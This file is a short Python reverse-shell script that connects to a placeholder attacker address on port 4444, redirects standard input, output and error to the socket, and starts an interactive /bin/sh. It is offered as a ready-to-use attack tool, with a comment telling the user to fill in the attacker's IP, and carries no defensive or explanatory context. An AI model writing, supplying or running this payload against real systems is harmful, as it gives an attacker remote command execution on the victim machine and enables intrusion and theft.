#!/usr/bin/env python3
import socket
import subprocess
import os

# Change this to your attacker's IP and desired port
ATTACKER_IP = "YOUR_IP"
ATTACKER_PORT = 4444

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    os.dup2(s.fileno(), 0)  # Redirect stdin
    os.dup2(s.fileno(), 1)  # Redirect stdout
    os.dup2(s.fileno(), 2)  # Redirect stderr
    subprocess.call(["/bin/sh", "-i"])

reverse_shell()
